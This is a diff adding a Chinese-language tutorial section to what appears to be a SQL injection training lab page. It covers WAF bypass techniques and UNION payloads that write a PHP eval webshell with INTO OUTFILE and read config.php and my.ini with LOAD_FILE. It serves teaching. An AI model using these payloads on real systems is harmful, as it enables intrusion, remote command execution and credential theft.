@@ -1,0 +1,39 @@
+<h4>绕过技巧</h4>
+<ul>
+<li><b>关键字被 WAF 拦截</b>：<code>union</code> → <code>/*!50000union*/</code>、<code>unio/**/n</code>、<code>UnIoN</code>；<code>INTO OUTFILE</code> 同样可用内联注释拆开。</li>
+<li><b>引号被过滤</b>：用十六进制字面量表达路径或内容，例如 <code>0x2f7661722f7777772f...</code>；或用 <code>char(47,118,97,114)</code> 拼接目录分隔符。</li>
+<li><b>路径被关键字检测</b>：用 <code>concat(0x45,0x3a,0x2f,...)</code> 拼接完整路径，避免请求里出现明显盘符。</li>
+<li><b>LOAD_FILE 被禁用</b>：改用 <code>INTO OUTFILE</code> 把数据写入可访问目录再读取；或把读到的内容与 <code>HEX()</code>、<code>substr()</code> 配合分段外带。</li>
+<li><b>目标文件已存在</b>：换文件名，或先用其他方式删除（如通过已拿到的 WebShell）。</li>
+</ul>
+
+<h4>进阶：写入 WebShell</h4>
+<p>当 <code>files/</code> 目录可被 Web 访问、且 PHP 可执行时，可以把 PHP 代码写进文件，再连接获取命令执行权限（本靶场仅用于教学演示）：</p>
+<pre>
+# 写入一句话木马（注意页面中 &lt; &gt; 需转义，实际请求里是原始 PHP 代码）
+?id=-1 UNION SELECT 1,'&lt;?php @eval($_POST[1]);?&gt;',3,4 INTO OUTFILE '{{BASE_DIR}}/modules/sqli/files/shell.php'
+
+# 写入后访问确认文件是否存在
+{{SITE}}/modules/sqli/files/shell.php
+
+# 用中国蚁剑 / Burp 以 POST 参数 1 执行命令
+1=phpinfo();
+1=system('whoami');
+</pre>
+<p>写入的 PHP 文件开头会带上 <code>1</code> 与制表符（OUTFILE 会按列分隔），这不影响 PHP 解析与执行。</p>
+
+<h4>进阶：读取配置与源码</h4>
+<pre>
+# 读取数据库配置（明文密码常在 config.php 中）
+?id=-1 UNION SELECT 1,LOAD_FILE('{{BASE_DIR}}/config.php'),3,4
+
+# 十六进制读取，避免换行导致显示截断
+?id=-1 UNION SELECT 1,HEX(LOAD_FILE('{{BASE_DIR}}/config.php')),3,4
+
+# 读取 MySQL 配置文件，确认 secure_file_priv 的真实值
+# 把「安装路径」替换为你本机 phpStudy 的安装位置，MySQL 版本目录按实际填写
+?id=-1 UNION SELECT 1,LOAD_FILE('安装路径/Extensions/MySQL5.7.x/my.ini'),3,4
+</pre>
+
+<h4>为什么有时只能写不能读</h4>
+<p><code>LOAD_FILE</code> 与 <code>INTO OUTFILE</code> 共用同一个 <code>FILE</code> 权限与 <code>secure_file_priv</code> 目录限制，但读文件还额外要求 MySQL 进程对文件有读权限、文件大小不超过 <code>max_allowed_packet</code>。写文件则要求目录存在且可写、目标文件不存在。两者失败时分别对应不同的错误码，可据此定位。</p>
